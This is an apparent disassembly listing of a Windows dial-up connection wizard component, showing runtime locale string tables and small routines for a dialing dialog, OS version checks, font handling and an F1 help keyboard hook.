		push	edx
		add	[edi+ebp+0], cl
		add	[edi+42h], eax
		push	edx

loc_1002E07:				; CODE XREF: .text:___rg_countryj
		add	[edi+ebp+0], al
		add	[esi+4Ch], ecx
		inc	esp
		add	[eax], bh
		das
		add	[ecx], al
		dec	eax
		dec	ebx
		inc	edi
		add	[edi+ebp], ch
		add	[ecx], al
		dec	esi
		pop	edx
		dec	esp
		add	[eax], ch
		das
		add	[ecx], al
		dec	esi
		pop	edx
		dec	esp
		add	[edi+ebp], bl
		add	[ecx], al
		inc	ebx
		dec	eax
		dec	esi
		add	[eax], dl
		das
		add	[ecx], al
		inc	ebx
		dec	eax
		dec	esi
		add	[edi+ebp], al
		add	[ecx], al
		push	eax
		push	edx
		dec	ecx
		add	ah, bh
		add	cs:[ecx], al
		push	ebx
		push	esi
		dec	ebx
		add	ah, ch
		add	cs:[ecx], al
		pop	edx
		inc	ecx
		inc	esi
		add	al, ah
		add	cs:[ecx], al
		dec	ebx
		dec	edi
		push	edx
		add	al, dl
		add	cs:[ecx], al
		pop	edx
		inc	ecx
		inc	esi
		add	ah, al
		add	cs:[ecx], al
		dec	ebx
		dec	edi
		push	edx
		add	[eax+5401002Eh], dh
		push	esp
		dec	edi
		add	[eax+47010031h], bl
		inc	edx
		push	edx
		add	[eax+4701002Eh], ah
		inc	edx
		push	edx
		add	[eax+5501002Eh], dl
		push	ebx
		inc	ecx
		add	[ecx+esi+53550100h], dl
		inc	ecx
		add	[ebp+6Eh], dh
		imul	esi, [ebp+64h],	6174732Dh
		jz	short near ptr aSlovak+5
		jnb	short $+2
; ---------------------------------------------------------------------------
		dw 0
aUnitedKingdom	db 'united-kingdom',0
		align 10h
aTrinidadTobago	db 'trinidad & tobago',0
		align 4
aSouthKorea_0	db 'south-korea',0
aSouthAfrica_1	db 'south-africa',0
		align 10h
aSouthKorea	db 'south korea',0
aSouthAfrica_0	db 'south africa',0
		align 4
aSlovak		db 'slovak',0           ; CODE XREF: .text:01002E9Aj
		align 4
aPuertoRico	db 'puerto-rico',0
aPrChina	db 'pr-china',0
		align 4
aPrChina_0	db 'pr china',0
		align 4
aNz		db 'nz',0
		align 4
aNewZealand	db 'new-zealand',0
aHongKong	db 'hong-kong',0
		align 4
aHolland	db 'holland',0
aGreatBritain	db 'great britain',0
		align 4
aEngland	db 'england',0
aCzech		db 'czech',0
		align 4
aChina		db 'china',0
		align 4
aBritain	db 'britain',0
aAmerica	db 'america',0
		align 8

___rg_language:				; DATA XREF: ___get_qualified_locale+A7o
		cwde
		xor	eax, 4E450100h
		push	ebp
		add	[ebp+esi+4E450100h], al
		push	ebp
		add	[eax+35h], dh
		add	[ecx], al
		inc	ebp
		dec	esi
		push	ebp
		add	[ebp+esi+0], ah
		add	[ebp+4Eh], eax
		inc	ecx
		add	[ebp+esi+0], bl
		add	[esi+4Ch], ecx
		inc	edx
		add	[eax+35h], dl
		add	[ecx], al
		inc	ebp
		dec	esi
		inc	ebx
		add	[ebp+esi+0], cl
		add	[edx+48h], ebx
		dec	eax
		add	[eax+35h], cl
		add	[ecx], al
		pop	edx
		dec	eax
		dec	ecx
		add	[eax+35h], al
		add	[ecx], al
		inc	ebx
		dec	eax
		push	ebx
		add	ds:485A0100h[esi], ch
		dec	eax
		add	[eax], bl
		xor	eax, 48430100h
		push	ebx
		add	ds:485A0100h[esi], al
		dec	ecx
		add	al, dh
		xor	al, 0
		add	[ebx+48h], eax
		push	esp
		add	al, ah
		xor	al, 0
		add	[esi+4Ch], ecx
		inc	edx
		add	ah, cl
		xor	al, 0
		add	[ebp+4Eh], eax
		push	ebp
		add	al, al
		xor	al, 0
		add	[ebp+4Eh], eax
		inc	ecx
		add	[eax+45010034h], dh
		dec	esi
		dec	esp
		add	[esp+esi+4E450100h], ah
		inc	ebx
		add	[eax+45010034h], dl
		dec	esi
		inc	edx
		add	[esp+esi+4E450100h], al
		dec	ecx
		add	[esp+esi+0], dh
		add	[ebp+4Eh], eax
		dec	edx
		add	[eax+34h], ch
		add	[ecx], al
		inc	ebp
		dec	esi
		pop	edx
		add	[eax+34h], dl
		add	[ecx], al
		inc	ebp
		dec	esi
		push	ebx
		add	[esp+esi], dh
		add	[ecx], al
		inc	ebp
		dec	esi
		push	esp
		add	[eax], ch
		xor	al, 0
		add	[ebp+4Eh], eax
		inc	edi
		add	[esp+esi], bl
		add	[ecx], al
		inc	ebp
		dec	esi
		push	ebp
		add	[eax], dl
		xor	al, 0
		add	[ebp+4Eh], eax
		push	ebp
; ---------------------------------------------------------------------------
		db 0
		dd offset aFrenchBelgian ; "french-belgian"
		dd 425246h, 10033F0h, 435246h, 10033DCh, 4C5246h, 10033CCh
		dd 535246h, 10033BCh, 414544h, 10033A8h, 434544h, 1003394h
		dd 4C4544h, 1003384h, 534544h, 1003374h, 494E45h, 1003364h
		dd 535449h, 1003358h, 524F4Eh, 1003344h, 524F4Eh, 1003330h
		dd 4E4F4Eh, 1003318h, 425450h, 1003304h, 535345h, 10032F4h
		dd 425345h, 10032E4h, 4C5345h, 10032D0h, 4F5345h, 10032BCh
		dd 435345h, 10032A0h, 445345h, 1003290h, 465345h, 100327Ch
		dd 455345h, 1003268h, 475345h, 1003254h, 485345h, 1003244h
		dd 4D5345h, 1003234h, 4E5345h, 1003220h, 495345h, 1003210h
		dd 415345h, 10031FCh, 5A5345h, 10031ECh, 525345h, 10031D8h
		dd 555345h, 10031C8h, 595345h, 10031B4h, 565345h, 10031A4h
		dd 465653h, 100319Ch, 534544h, 1003198h, 474E45h, 1003194h
		dd 554E45h, 1003190h, 554E45h, 617375h,	7375h
aUk		db 'uk',0
		align 4
aSwiss		db 'swiss',0
		align 4
aSwedishFinland	db 'swedish-finland',0
aSpanishVenezue	db 'spanish-venezuela',0
		align 4
aSpanishUruguay	db 'spanish-uruguay',0
aSpanishPuertoR	db 'spanish-puerto rico',0
aSpanishPeru	db 'spanish-peru',0
		align 4
aSpanishParagua	db 'spanish-paraguay',0
		align 10h
aSpanishPanama	db 'spanish-panama',0
		align 10h
aSpanishNicarag	db 'spanish-nicaragua',0
		align 4
aSpanishModern	db 'spanish-modern',0
		align 4
aSpanishMexican	db 'spanish-mexican',0
aSpanishHondura	db 'spanish-honduras',0
		align 4
aSpanishGuatema	db 'spanish-guatemala',0
		align 4
aSpanishElSalva	db 'spanish-el salvador',0
aSpanishEcuador	db 'spanish-ecuador',0
aSpanishDominic	db 'spanish-dominican republic',0
		align 4
aSpanishCostaRi	db 'spanish-costa rica',0
		align 10h
aSpanishColombi	db 'spanish-colombia',0
		align 4
aSpanishChile	db 'spanish-chile',0
		align 4
aSpanishBolivia	db 'spanish-bolivia',0
aSpanishArgenti	db 'spanish-argentina',0
		align 4
aPortugueseBraz	db 'portuguese-brazilian',0
		align 10h
aNorwegianNyn_0	db 'norwegian-nynorsk',0
		align 4
aNorwegianBokma	db 'norwegian-bokmal',0
		align 4
aNorwegian	db 'norwegian',0
		align 4
aItalianSwiss	db 'italian-swiss',0
		align 4
aIrishEnglish	db 'irish-english',0
		align 4
aGermanSwiss	db 'german-swiss',0
		align 4
aGermanLuxembou	db 'german-luxembourg',0
		align 4
aGermanLichtens	db 'german-lichtenstein',0
aGermanAustrian	db 'german-austrian',0
aFrenchSwiss	db 'french-swiss',0
		align 4
aFrenchLuxembou	db 'french-luxembourg',0
		align 10h
aFrenchCanadian	db 'french-canadian',0
aFrenchBelgian	db 'french-belgian',0   ; DATA XREF: .text:01003060o
		align 10h
aEnglishUsa	db 'english-usa',0
aEnglishUs	db 'english-us',0
		align 4
aEnglishUk	db 'english-uk',0
		align 4
aEnglishTrinida	db 'english-trinidad y tobago',0
		align 10h
aEnglishSouthAf	db 'english-south africa',0
		align 4
aEnglishNz	db 'english-nz',0
		align 4
aEnglishJamaica	db 'english-jamaica',0
aEnglishIre	db 'english-ire',0
aEnglishCaribbe	db 'english-caribbean',0
		align 4
aEnglishCan	db 'english-can',0
aEnglishBelize	db 'english-belize',0
		align 10h
aEnglishAus	db 'english-aus',0
aEnglishAmerica	db 'english-american',0
		align 10h
aDutchBelgian	db 'dutch-belgian',0
		align 10h
aChineseTraditi	db 'chinese-traditional',0
aChineseSingapo	db 'chinese-singapore',0
		align 4
aChineseSimplif	db 'chinese-simplified',0
		align 4
aChineseHongkon	db 'chinese-hongkong',0
		align 10h
aChinese	db 'chinese',0
aChi		db 'chi',0
aChh		db 'chh',0
aCanadian	db 'canadian',0
		align 4
aBelgian	db 'belgian',0
aAustralian	db 'australian',0
		align 10h
aAmericanEnglis	db 'american-english',0
		align 4
aAmericanEngl_0	db 'american english',0
		align 4
aAmerican	db 'american',0
		align 4
aOcp		db 'OCP',0              ; DATA XREF: sub_1009299+30o
aAcp		db 'ACP',0              ; DATA XREF: sub_1009299+20o
aNorwegianNynor	db 'Norwegian-Nynorsk',0 ; DATA XREF: ___get_qualified_locale+164o
		align 10h
stru_10035C0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_1009C96, offset loc_1009C9A>
					; DATA XREF: ___crtGetStringTypeA+2o
					; SEH scope table for function 1009BB5
; char aGetprocesswind[]
aGetprocesswind	db 'GetProcessWindowStation',0 ; DATA XREF: ___crtMessageBoxA+75o
; char aGetuserobjecti[]
aGetuserobjecti	db 'GetUserObjectInformationA',0 ; DATA XREF: ___crtMessageBoxA+64o
		align 10h
; char aGetlastactivep[]
aGetlastactivep	db 'GetLastActivePopup',0 ; DATA XREF: ___crtMessageBoxA+49o
		align 4
; char aGetactivewindo[]
aGetactivewindo	db 'GetActiveWindow',0  ; DATA XREF: ___crtMessageBoxA+41o
; char aMessageboxa[]
aMessageboxa	db 'MessageBoxA',0      ; DATA XREF: ___crtMessageBoxA+30o
; char aUser32_dll_0[]
aUser32_dll_0	db 'user32.dll',0       ; DATA XREF: ___crtMessageBoxA+15o
		align 10h

___lookuptable:
		push	es
; ---------------------------------------------------------------------------
		db 2 dup(0), 6
		dd 100h, 6030010h, 10020600h, 45454504h, 5050505h, 303505h
		dd 50h,	38282000h, 8075850h, 30303700h,	75057h,	8202000h
		dd 0
		dd 60686008h, 606060h, 78707000h, 8787878h, 807h, 8080007h
		dd 8000008h, 7000800h, 8
aNull:					; DATA XREF: .data:___wnullstringo
		unicode	0, <(null)>,0
		align 4
aNull_0		db '(null)',0           ; DATA XREF: .data:___nullstringo
		align 8
stru_10036B8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_100B3F8, offset loc_100B3FC>
					; DATA XREF: ___convertcp+2o
					; SEH scope table for function 100B30A
aHhMmSs		db 'HH:mm:ss',0         ; DATA XREF: .data:0100E7D0o
		align 10h
aDdddMmmmDdYyyy	db 'dddd, MMMM dd, yyyy',0 ; DATA XREF: .data:0100E7CCo
aMmDdYy		db 'MM/dd/yy',0         ; DATA XREF: .data:0100E7C8o
		align 10h
aPm		db 'PM',0               ; DATA XREF: .data:0100E7C4o
		align 4
aAm		db 'AM',0               ; DATA XREF: .data:0100E7C0o
		align 4
aDecember	db 'December',0         ; DATA XREF: .data:0100E7BCo
		align 4
aNovember	db 'November',0         ; DATA XREF: .data:0100E7B8o
		align 10h
aOctober	db 'October',0          ; DATA XREF: .data:0100E7B4o
aSeptember	db 'September',0        ; DATA XREF: .data:0100E7B0o
		align 4
aAugust		db 'August',0           ; DATA XREF: .data:0100E7ACo
		align 4
aJuly		db 'July',0             ; DATA XREF: .data:0100E7A8o
		align 4
aJune		db 'June',0             ; DATA XREF: .data:0100E7A4o
		align 4
aApril		db 'April',0            ; DATA XREF: .data:0100E79Co
		align 4
aMarch		db 'March',0            ; DATA XREF: .data:0100E798o
		align 4
aFebruary	db 'February',0         ; DATA XREF: .data:0100E794o
		align 4
aJanuary	db 'January',0          ; DATA XREF: .data:0100E790o
aDec		db 'Dec',0              ; DATA XREF: .data:0100E78Co
aNov		db 'Nov',0              ; DATA XREF: .data:0100E788o
aOct		db 'Oct',0              ; DATA XREF: .data:0100E784o
aSep		db 'Sep',0              ; DATA XREF: .data:0100E780o
aAug		db 'Aug',0              ; DATA XREF: .data:0100E77Co
aJul		db 'Jul',0              ; DATA XREF: .data:0100E778o
aJun		db 'Jun',0              ; DATA XREF: .data:0100E774o
aMay		db 'May',0              ; DATA XREF: .data:0100E770o
					; .data:0100E7A0o
aApr		db 'Apr',0              ; DATA XREF: .data:0100E76Co
aMar		db 'Mar',0              ; DATA XREF: .data:0100E768o
aFeb		db 'Feb',0              ; DATA XREF: .data:0100E764o
aJan		db 'Jan',0              ; DATA XREF: .data:0100E760o
aSaturday	db 'Saturday',0         ; DATA XREF: .data:0100E75Co
		align 4
aFriday		db 'Friday',0           ; DATA XREF: .data:0100E758o
		align 4
aThursday	db 'Thursday',0         ; DATA XREF: .data:0100E754o
		align 10h
aWednesday	db 'Wednesday',0        ; DATA XREF: .data:0100E750o
		align 4
aTuesday	db 'Tuesday',0          ; DATA XREF: .data:0100E74Co
aMonday		db 'Monday',0           ; DATA XREF: .data:0100E748o
		align 4
aSunday		db 'Sunday',0           ; DATA XREF: .data:0100E744o
		align 4
aSat		db 'Sat',0              ; DATA XREF: .data:0100E740o
aFri		db 'Fri',0              ; DATA XREF: .data:0100E73Co
aThu		db 'Thu',0              ; DATA XREF: .data:0100E738o
aWed		db 'Wed',0              ; DATA XREF: .data:0100E734o
aTue		db 'Tue',0              ; DATA XREF: .data:0100E730o
aMon		db 'Mon',0              ; DATA XREF: .data:0100E72Co
aSun		db 'Sun',0              ; DATA XREF: .data:___lc_time_co
stru_10037F0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_100C09A, offset loc_100C09E>
					; DATA XREF: ___crtGetLocaleInfoW+2o
					; SEH scope table for function 100BFE2
		align 10h
stru_1003800	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_100C1C6, offset loc_100C1CA>
					; DATA XREF: ___crtGetLocaleInfoA+2o
					; SEH scope table for function 100C117
; ---------------------------------------------------------------------------

___dnames:
		push	ebx
		jnz	short near ptr dword_100387C+1
		dec	ebp
		outsd
		outsb
		push	esp
		jnz	short near ptr dword_1003878+2
		push	edi
		db	65h, 64h
		push	esp
		push	69724675h
		push	ebx
		popa
		jz	short $+2
; ---------------------------------------------------------------------------
		dw 0
; ---------------------------------------------------------------------------

___mnames:
		dec	edx
		popa
		outsb
		inc	esi
		bound	ecx, gs:[ebp+61h]
		jb	short near ptr dword_100386C+3
		jo	short loc_10038A2
		dec	ebp
		popa
		jns	short near ptr dword_100387C+2
		jnz	short loc_10038A4
		dec	edx
		jnz	short loc_10038A5
		inc	ecx
		jnz	short loc_10038A3
		push	ebx
		db	65h
		jo	short near ptr off_100388C+3
		arpl	[esi+ecx*2+6Fh], si
		jbe	short near ptr dword_1003888+2
		arpl	gs:[eax], ax
; ---------------------------------------------------------------------------
		db 3 dup(0)
		align 10h
__load_config_used dd 48h		; Size
		dd 0			; Time stamp
		dw 2 dup(0)		; Version: 0.0
		dd 0			; GlobalFlagsClear
		dd 0			; GlobalFlagsSet
		dd 0			; CriticalSectionDefaultTimeout
		dd 0			; DeCommitFreeBlockThreshold
dword_100386C	dd 0			; CODE XREF: .text:0100382Cj
					; DeCommitTotalFreeThreshold
		dd 0			; LockPrefixTable
		dd 0			; MaximumAllocationSize
dword_1003878	dd 0			; CODE XREF: .text:01003813j
					; VirtualMemoryThreshold
dword_100387C	dd 0			; CODE XREF: .text:0100380Dj
					; .text:01003832j
					; ProcessAffinityMask
		dd 0			; ProcessHeapFlags
		dw 0			; CSDVersion
		dw 0			; Reserved1
dword_1003888	dd 0			; CODE XREF: .text:01003844j
					; EditList
off_100388C	dd offset ___security_cookie ; CODE XREF: .text:0100383Dj
					; SecurityCookie
		dd offset ___safe_se_handler_table ; SEHandlerTable
		dd 2			; SEHandlerCount
		dd 53445352h, 693552CFh
		db 0BCh, 0A6h
; ---------------------------------------------------------------------------

loc_10038A2:				; CODE XREF: .text:0100382Ej
		push	edx

loc_10038A3:				; CODE XREF: .text:0100383Aj
		inc	ecx

loc_10038A4:				; CODE XREF: .text:01003834j
		wait

loc_10038A5:				; CODE XREF: .text:01003837j
		xor	eax, 93062BB4h
		and	dh, ch
		add	[eax], eax
; ---------------------------------------------------------------------------
		dw 0
		dd 43574349h, 324E4E4Fh, 6264702Eh, 0
___safe_se_handler_table dd rva	__except_handler3 ; DATA XREF: .text:01003890o
		dd rva sub_100ABF8
		dd 3 dup(0)
		db 0

; =============== S U B	R O U T	I N E =======================================


; void Dprintf(const unsigned __int16 *, ...)
?Dprintf@@YAXPBGZZ proc	near		; CODE XREF: RNAAPI::RasGetEntryPropertiesW(ushort *,ushort *,uchar *,ulong *,uchar *,ulong *)+8Dp
					; FindFirstWhiteSpace(ushort *)+30p ...
		retn
?Dprintf@@YAXPBGZZ endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; void __stdcall LineCallback(DWORD, DWORD, DWORD, DWORD, DWORD, DWORD)
?LineCallback@@YGXKKKKKK@Z proc	near	; DATA XREF: DialErrGetDisplayableNumber(void)+15o
					; DialErrDlgProc(x,x,x,x)+22Ao
		retn	18h
?LineCallback@@YGXKKKKKK@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ShowDialingDialog(LPCWSTR	lpString2, int,	int, int, HWND hWnd, int)
?ShowDialingDialog@@YAJPAGPAUtagGATHEREDINFO@@0PAUHINSTANCE__@@PAUHWND__@@0@Z proc near
					; CODE XREF: CallDownLoad(ushort *,HINSTANCE__ *)+1DCp

var_2C		= dword	ptr -2Ch
hMem		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
lpString2	= dword	ptr  8
arg_C		= dword	ptr  14h
hWnd		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	eax, ?g_pdevice@@3PAUtagDEVICE@@A ; tagDEVICE *	g_pdevice
		test	eax, eax
		push	edi
		jnz	short loc_1003936
		push	12Ch		; dwBytes
		push	40h		; uFlags
		call	ds:__imp__GlobalAlloc@8	; GlobalAlloc(x,x)
		test	eax, eax
		mov	?g_pdevice@@3PAUtagDEVICE@@A, eax ; tagDEVICE *	g_pdevice
		jnz	short loc_1003936
		push	10h		; uType
		push	1F4h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpCaption
		push	1F7h		; unsigned __int16
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		pop	ecx
		push	eax		; lpText
		push	[ebp+hWnd]	; hWnd
		call	ds:__imp__MessageBoxW@16 ; MessageBoxW(x,x,x,x)
		push	8
		pop	edi
		jmp	loc_1003A05
; ---------------------------------------------------------------------------

loc_1003936:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+10j
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+26j
		or	dword ptr [eax], 0FFFFFFFFh
		push	esi
		push	0Bh
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+var_2C]
		rep stosd
		push	1F9h		; unsigned __int16
		mov	[ebp+var_2C], 2Ch
		call	?GetSz@@YAPAGG@Z ; GetSz(ushort)
		push	eax		; lpString2
		lea	eax, [ebp+hMem]
		push	eax		; int
		call	?StrDup@@YAPAGPAPAGPBG@Z ; StrDup(ushort * *,ushort const *)
		push	[ebp+lpString2]	; lpString2
		lea	eax, [ebp+var_24]
		push	eax		; int
		call	?StrDup@@YAPAGPAPAGPBG@Z ; StrDup(ushort * *,ushort const *)
		lea	eax, [ebp+var_20]
		push	offset ?pszSetupClientURL@@3PAGA ; lpString2
		push	eax		; int
		call	?StrDup@@YAPAGPAPAGPBG@Z ; StrDup(ushort * *,ushort const *)
		mov	eax, [ebp+arg_C]
		push	[ebp+arg_14]	; lpString2
		mov	[ebp+var_14], eax
		xor	eax, eax
		cmp	?uiSetupClientNewPhoneCall@@3IA, eax ; uint uiSetupClientNewPhoneCall
		mov	[ebp+var_18], offset ?StatusMessageCallback@@YGJKPAGK@Z	; StatusMessageCallback(ulong,ushort *,ulong)
		setz	al
		mov	[ebp+var_8], eax
		lea	eax, [ebp+var_C]
		push	eax		; int
		call	?StrDup@@YAPAGPAPAGPBG@Z ; StrDup(ushort * *,ushort const *)
		add	esp, 24h
		push	offset LibFileName ; "icwdial.dll"
		call	ds:__imp__LoadLibraryW@4 ; LoadLibraryW(x)
		mov	esi, eax
		test	esi, esi
		jnz	short loc_10039BE

loc_10039B4:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+E9j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		mov	edi, eax
		jmp	short loc_1003A04
; ---------------------------------------------------------------------------

loc_10039BE:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+CFj
		push	offset ProcName	; "DialingDownloadDialog"
		push	esi		; hModule
		call	ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)
		test	eax, eax
		jz	short loc_10039B4
		lea	ecx, [ebp+var_2C]
		push	ecx
		call	eax
		push	esi		; hLibModule
		mov	edi, eax
		call	ds:__imp__FreeLibrary@4	; FreeLibrary(x)
		cmp	[ebp+hMem], 0
		mov	esi, ds:__imp__GlobalFree@4 ; GlobalFree(x)
		jz	short loc_10039EE
		push	[ebp+hMem]	; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_10039EE:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+104j
		cmp	[ebp+var_24], 0
		jz	short loc_10039F9
		push	[ebp+var_24]	; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_10039F9:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+10Fj
		cmp	[ebp+var_20], 0
		jz	short loc_1003A04
		push	[ebp+var_20]	; hMem
		call	esi ; GlobalFree(x) ; GlobalFree(x)

loc_1003A04:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+D9j
					; ShowDialingDialog(ushort *,tagGATHEREDINFO *,ushort *,HINSTANCE__ *,HWND__ *,ushort *)+11Aj
		pop	esi

loc_1003A05:				; CODE XREF: ShowDialingDialog(ushort *,tagGATHEREDINFO	*,ushort *,HINSTANCE__ *,HWND__	*,ushort *)+4Ej
		mov	eax, edi
		pop	edi
		leave
		retn
?ShowDialingDialog@@YAJPAGPAUtagGATHEREDINFO@@0PAUHINSTANCE__@@PAUHWND__@@0@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl IsNT()
?IsNT@@YAHXZ	proc near		; CODE XREF: ProcessDBCS(HWND__	*,int)+5p
					; DialErrDlgProc(x,x,x,x)+87p ...

VersionInformation= _OSVERSIONINFOW ptr	-118h
var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 118h
		mov	eax, ___security_cookie
		push	edi
		mov	[ebp+var_4], eax
		push	45h
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp+VersionInformation]
		rep stosd
		lea	eax, [ebp+VersionInformation]
		push	eax		; lpVersionInformation
		mov	[ebp+VersionInformation.dwOSVersionInfoSize], 114h
		call	ds:__imp__GetVersionExW@4 ; GetVersionExW(x)
		mov	ecx, [ebp+var_4]
		xor	eax, eax
		cmp	[ebp+VersionInformation.dwPlatformId], 2
		pop	edi
		setz	al
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
?IsNT@@YAHXZ	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl ProcessDBCS(HWND hDlg, int nIDDlgItem)
?ProcessDBCS@@YAXPAUHWND__@@H@Z	proc near ; CODE XREF: DialErrDlgProc(x,x,x,x)+134p
					; DialErrDlgProc(x,x,x,x)+13Bp

hDlg		= dword	ptr  8
nIDDlgItem	= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		call	?IsNT@@YAHXZ	; IsNT(void)
		test	eax, eax
		jnz	short loc_1003AA1
		push	esi
		mov	esi, ds:__imp__GetStockObject@4	; GetStockObject(x)
		push	11h		; i
		call	esi ; GetStockObject(x)	; GetStockObject(x)
		test	eax, eax
		jnz	short loc_1003A88
		push	0Dh		; i
		call	esi ; GetStockObject(x)	; GetStockObject(x)
		test	eax, eax
		jz	short loc_1003AA0

loc_1003A88:				; CODE XREF: ProcessDBCS(HWND__	*,int)+1Bj
		push	1		; lParam
		push	eax		; wParam
		push	30h		; Msg
		push	[ebp+nIDDlgItem] ; nIDDlgItem
		push	[ebp+hDlg]	; hDlg
		call	ds:__imp__GetDlgItem@8 ; GetDlgItem(x,x)
		push	eax		; hWnd
		call	ds:__imp__SendMessageW@16 ; SendMessageW(x,x,x,x)

loc_1003AA0:				; CODE XREF: ProcessDBCS(HWND__	*,int)+23j
		pop	esi

loc_1003AA1:				; CODE XREF: ProcessDBCS(HWND__	*,int)+Cj
		pop	ebp
		retn
?ProcessDBCS@@YAXPAUHWND__@@H@Z	endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl LclSetEntryScriptPatch(unsigned __int16 *, unsigned __int16 *)
?LclSetEntryScriptPatch@@YAHPAG0@Z proc	near ; CODE XREF: DialErrDlgProc(x,x,x,x)+411p
					; DialErrDlgProc(x,x,x,x)+6BDp	...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	offset aIcwdial_dll ; "ICWDIAL.DLL"
		xor	edi, edi
		call	ds:__imp__LoadLibraryW@4 ; LoadLibraryW(x)
		mov	esi, eax
		test	esi, esi
		jz	short loc_1003AE3
		push	offset aRassetentrypro ; "RasSetEntryPropertiesScriptPatch"
		push	esi		; hModule
		call	ds:__imp__GetProcAddress@8 ; GetProcAddress(x,x)
		test	eax, eax
		jz	short loc_1003ADC
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	eax
		mov	edi, eax

loc_1003ADC:				; CODE XREF: LclSetEntryScriptPatch(ushort *,ushort *)+28j
		push	esi		; hLibModule
		call	ds:__imp__FreeLibrary@4	; FreeLibrary(x)

loc_1003AE3:				; CODE XREF: LclSetEntryScriptPatch(ushort *,ushort *)+18j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebp
		retn
?LclSetEntryScriptPatch@@YAHPAG0@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	HelpKybdHookProc(int nCode, WPARAM wParam, __int16)
?HelpKybdHookProc@@YGJHIJ@Z proc near	; DATA XREF: DialErrDlgProc(x,x,x,x)+159o

nCode		= dword	ptr  8
wParam		= dword	ptr  0Ch
arg_B		= byte ptr  13h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	edi
		xor	edi, edi
		cmp	[ebp+nCode], 3
		jz	short loc_1003B33
		cmp	[ebp+nCode], edi
		jl	short loc_1003B33
		mov	eax, ?g_pcDialErr@@3PAUtagDialErr@@A ; tagDialErr * g_pcDialErr
		push	esi
		mov	esi, [eax+0Ch]
		call	ds:__imp__GetActiveWindow@0 ; GetActiveWindow()
		cmp	eax, esi
		jnz	short loc_1003B32
		cmp	[ebp+wParam], 70h
		jnz	short loc_1003B32
		test	[ebp+arg_B], 80h
		jnz	short loc_1003B32
		push	edi		; lParam
		push	3EDh		; wParam
		push	111h		; Msg
		push	esi		; hWnd
		call	ds:__imp__PostMessageW@16 ; PostMessageW(x,x,x,x)

loc_1003B32:				; CODE XREF: HelpKybdHookProc(int,uint,long)+24j
					; HelpKybdHookProc(int,uint,long)+2Aj ...
		pop	esi

loc_1003B33:				; CODE XREF: HelpKybdHookProc(int,uint,long)+Cj
					; HelpKybdHookProc(int,uint,long)+11j
		mov	eax, hhk
		cmp	eax, edi
		jz	short loc_1003B4E
		push	dword ptr [ebp+10h] ; lParam
		push	[ebp+wParam]	; wParam
		push	[ebp+nCode]	; nCode
		push	eax		; hhk
		call	ds:__imp__CallNextHookEx@16 ; CallNextHookEx(x,x,x,x)
		mov	edi, eax

loc_1003B4E:				; CODE XREF: HelpKybdHookProc(int,uint,long)+4Cj
		mov	eax, edi
		pop	edi
		pop	ebp
		retn	0Ch
?HelpKybdHookProc@@YGJHIJ@Z endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall RNAAPI___scalar deleting destructor_(void *, char)
??_GRNAAPI@@QAEPAXI@Z proc near		; CODE XREF: MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+AFp
					; MyRasGetEntryProperties(ushort *,ushort *,tagRASENTRYW * *,ulong *,tagRASDEVINFOW * *,ulong *)+10Bp ...

arg_0		= byte ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
